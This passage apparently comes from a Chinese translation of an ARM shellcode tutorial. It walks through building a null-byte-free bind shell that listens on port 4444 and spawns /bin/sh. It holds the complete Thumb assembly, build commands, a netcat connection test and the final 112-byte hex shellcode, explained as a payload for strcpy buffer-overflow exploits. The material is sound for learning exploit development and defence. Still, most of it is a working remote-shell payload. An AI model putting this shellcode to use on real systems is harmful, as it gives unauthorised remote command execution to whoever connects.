    // bind(r0, &sockaddr, 16)
     adr r1, struct_addr // pointer to address, port
     [...]
    struct_addr:
    .ascii "\x02\xff" // AF_INET 0xff will be NULLed 
    .ascii "\x11\x5c" // port number 4444 
    .byte 1,1,1,1 // IP Address
接下来的5条指令是STRB（存储字节）指令。 STRB指令将一个字节从寄存器存储到计算的存储区域。
语法[r1，＃1]表示我们将R1作为基址，将立即值（＃1）作为偏移量。
在第一条指令中，我们让R1指向存储地址族AF_INET、要使用的本地端口和IP地址值的内存区域。
我们可以使用静态IP地址，也可以指定0.0.0.0以使绑定shell监听目标配置的所有IP，从而使我们的shellcode更具可移植性。
现在，剩下的是大量的空字节。
同样，我们想要摆脱所有空字节的原因是：让我们的shellcode可以利用内存损坏漏洞，而这种内存损坏漏洞是可能对空字节敏感的。'strcpy'等函数的使用不当会引起一些缓冲区的溢出。
strcpy的工作是复制数据，直到收到空字节。
我们使用溢出控制程序流，如果strcpy命中空字节，它将停止复制我们的shellcode，我们的漏洞将不起作用。使用strb指令，我们从寄存器中获取一个空字节，并在执行期间修改我们自己的代码。
这样，我们的shellcode中实际上没有空字节，而是动态地将它放在那里。 这要求代码段是可写的，并且可以通过在链接过程中添加-N标志来实现。
出于这个原因，我们的编码会动态地将空字节放在必要的地方，并且没有空字节。正如你在下一张图片中看到的那样，我们指定的IP地址是1.1.1.1，在执行期间它将被0.0.0.0替换。  
第一个STRB指令用x00替换\x02\xff中的占位符xff，将AF_INET设置为\x02\x00。 我们怎么知道它是一个空字节存储？
因为r2仅包含0，而“sub r2，r2，r2”指令清除了寄存器。 接下来的4条指令用0.0.0.0替换1.1.1.1。 在strb
r2，[r1，＃1]之后，你也可以使用一个单独的str r2 [r1，＃4]来完成0.0.0.0的完整写入，而不是四个strb指令。
move指令将sockaddr_in结构长度（AF_INET为2个字节，PORT为2个字节，ipaddress为4个字节，8个字节填充=
16个字节）放入r2。 然后，我们通过简单地给它添加1来将r7设置为282，因为r7已经包含来自最后一个系统调用的281。
    // bind(r0, &sockaddr, 16)
        adr r1, struct_addr // pointer to address, port
        strb r2, [r1, #1] // write 0 for AF_INET
        strb r2, [r1, #4] // replace 1 with 0 in x.1.1.1
        strb r2, [r1, #5] // replace 1 with 0 in 0.x.1.1
        strb r2, [r1, #6] // replace 1 with 0 in 0.0.x.1
        strb r2, [r1, #7] // replace 1 with 0 in 0.0.0.x
        mov r2, #16
        add r7, #1 // r7 = 281+1 = 282 (bind syscall number) 
        svc #1
        nop
## 3 - 监听传入连接
在这里我们将之前保存的host_sockid放入r0。 R1设置为2，r7仅增加2，因为它仍然保存了最后一次系统调用的282。
    mov r0, r4 // r0 = saved host_sockid 
    mov r1, #2
    add r7, #2 // r7 = 284 (listen syscall number)
    svc #1
## 4 - 接收传入连接
在这里，我们再次将保存的host_sockid放入r0。 由于要避免空字节，我们不直接将＃0移动到r1和r2中，而是通过将它们相减来设置为0。
R7只增加1。调用的结果将是client_sockid，把它保存在r4中，因为我们不再需要保存在那里的host_sockid(我们将跳过C代码中的close函数调用)。
    mov r0, r4 // r0 = saved host_sockid 
        sub r1, r1, r1 // clear r1, r1 = 0
        sub r2, r2, r2 // clear r2, r2 = 0
        add r7, #1 // r7 = 285 (accept syscall number)
        svc #1
        mov r4, r0 // save result (client_sockid) in r4
## 5 – STDIN, STDOUT, STDERR
对于dup2函数，我们需要系统调用号63。将保存的client_sockid再次移入r0，sub指令将r1设置为0。至于剩余的两个dup2调用，只需要更改r1并将r0重置为每次系统调用后的client_sockid。
    /* dup2(client_sockid, 0) */
        mov r7, #63 // r7 = 63 (dup2 syscall number) 
        mov r0, r4 // r4 is the saved client_sockid 
        sub r1, r1, r1 // r1 = 0 (stdin) 
        svc #1
    /* dup2(client_sockid, 1) */
        mov r0, r4 // r4 is the saved client_sockid 
        add r1, #1 // r1 = 1 (stdout) 
        svc #1
    /* dup2(client_sockid, 2) */
        mov r0, r4 // r4 is the saved client_sockid
        add r1, #1 // r1 = 1+1 (stderr) 
        svc #1
## 6 - 生成Shell
    // execve("/bin/sh", 0, 0) 
     adr r0, shellcode // r0 = location of "/bin/shX"
     eor r1, r1, r1 // clear register r1. R1 = 0
     eor r2, r2, r2 // clear register r2. r2 = 0
     strb r2, [r0, #7] // store null-byte for AF_INET
     mov r7, #11 // execve syscall number
     svc #1
     nop
我们在这个例子中使用的execve()函数遵循与[编写ARM Shellcode](https://azeria-labs.com/writing-arm-shellcode/)教程相同的过程，其中所有内容都是逐步解释的。  
最后，将AF_INET值（带有0xff，将替换为null），端口号，IP地址和“/bin/sh”字符串添加到汇编代码末尾。
    struct_addr:
    .ascii "\x02\xff" // AF_INET 0xff will be NULLed 
    .ascii "\x11\x5c" // port number 4444 
    .byte 1,1,1,1 // IP Address 
    shellcode:
    .ascii "/bin/shX"
# 最终的汇编代码
这是我们的最终绑定shellcode的样子。
    .section .text
    .global _start
        _start:
        .ARM
        add r3, pc, #1 // switch to thumb mode 
        bx r3
        .THUMB
    // socket(2, 1, 0)
        mov r0, #2
        mov r1, #1
        sub r2, r2, r2 // set r2 to null
        mov r7, #200 // r7 = 281 (socket)
        add r7, #81 // r7 value needs to be split 
        svc #1 // r0 = host_sockid value
        mov r4, r0 // save host_sockid in r4
    // bind(r0, &sockaddr, 16)
        adr r1, struct_addr // pointer to address, port
        strb r2, [r1, #1] // write 0 for AF_INET
        strb r2, [r1, #4] // replace 1 with 0 in x.1.1.1
        strb r2, [r1, #5] // replace 1 with 0 in 0.x.1.1
        strb r2, [r1, #6] // replace 1 with 0 in 0.0.x.1
        strb r2, [r1, #7] // replace 1 with 0 in 0.0.0.x
        mov r2, #16 // struct address length
        add r7, #1 // r7 = 282 (bind) 
        svc #1
        nop
    // listen(sockfd, 0) 
        mov r0, r4 // set r0 to saved host_sockid
        mov r1, #2        
        add r7, #2 // r7 = 284 (listen syscall number) 
        svc #1        
    // accept(sockfd, NULL, NULL); 
        mov r0, r4 // set r0 to saved host_sockid
        sub r1, r1, r1 // set r1 to null
        sub r2, r2, r2 // set r2 to null
        add r7, #1 // r7 = 284+1 = 285 (accept syscall)
        svc #1 // r0 = client_sockid value
        mov r4, r0 // save new client_sockid value to r4  
    // dup2(sockfd, 0) 
        mov r7, #63 // r7 = 63 (dup2 syscall number) 
        mov r0, r4 // r4 is the saved client_sockid 
        sub r1, r1, r1 // r1 = 0 (stdin) 
        svc #1
    // dup2(sockfd, 1)
        mov r0, r4 // r4 is the saved client_sockid 
        add r1, #1 // r1 = 1 (stdout) 
        svc #1
    // dup2(sockfd, 2) 
        mov r0, r4 // r4 is the saved client_sockid
        add r1, #1 // r1 = 2 (stderr) 
        svc #1
    // execve("/bin/sh", 0, 0) 
        adr r0, shellcode // r0 = location of "/bin/shX"
        eor r1, r1, r1 // clear register r1. R1 = 0
        eor r2, r2, r2 // clear register r2. r2 = 0
        strb r2, [r0, #7] // store null-byte for AF_INET
        mov r7, #11 // execve syscall number
        svc #1
        nop
    struct_addr:
    .ascii "\x02\xff" // AF_INET 0xff will be NULLed 
    .ascii "\x11\x5c" // port number 4444 
    .byte 1,1,1,1 // IP Address 
    shellcode:
    .ascii "/bin/shX"
# 测试SHELLCODE
将汇编代码保存到名为bind_shell.s的文件中。 使用ld时不要忘记-N标志。
这样做的原因是我们使用多个strb操作来修改我们的代码段（.text）。 这要求代码段是可写的，并且可以通过在链接过程中添加-N标志来实现。
    pi@raspberrypi:~/bindshell $ as bind_shell.s -o bind_shell.o && ld -N bind_shell.o -o bind_shell
    pi@raspberrypi:~/bindshell $ ./bind_shell
然后，连接到指定的端口：
    pi@raspberrypi:~ $ netcat -vv 0.0.0.0 4444
    Connection to 0.0.0.0 4444 port [tcp/*] succeeded!
    uname -a
    Linux raspberrypi 4.4.34+ #3 Thu Dec 1 14:44:23 IST 2016 armv6l GNU/Linux
成功了！ 现在让我们使用以下命令将其转换为十六进制字符串：
    pi@raspberrypi:~/bindshell $ objcopy -O binary bind_shell bind_shell.bin
    pi@raspberrypi:~/bindshell $ hexdump -v -e '"\\""x" 1/1 "%02x" ""' bind_shell.bin
    \x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c\x12\xa1\x4a\x70\x0a\x71\x4a\x71\x8a\x71\xca\x71\x10\x22\x01\x37\x01\xdf\xc0\x46\x20\x1c\x02\x21\x02\x37\x01\xdf\x20\x1c\x49\x1a\x92\x1a\x01\x37\x01\xdf\x04\x1c\x3f\x27\x20\x1c\x49\x1a\x01\xdf\x20\x1c\x01\x31\x01\xdf\x20\x1c\x01\x31\x01\xdf\x05\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\xc0\x46\x02\xff\x11\x5c\x01\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58
瞧，这就是绑定shellcode！ 这个shellcode长112个字节。 由于这是一个初学者教程，为了保持简单，shellcode并不是那么简短。
在初步完成shellcode之后，你可以尝试找到减少指令量的方法，从而缩短shellcode。  
希望你能学到一些东西，可以运用这些知识来编写你自己的变种shellcode。 请随时与我联系以获得反馈或建议。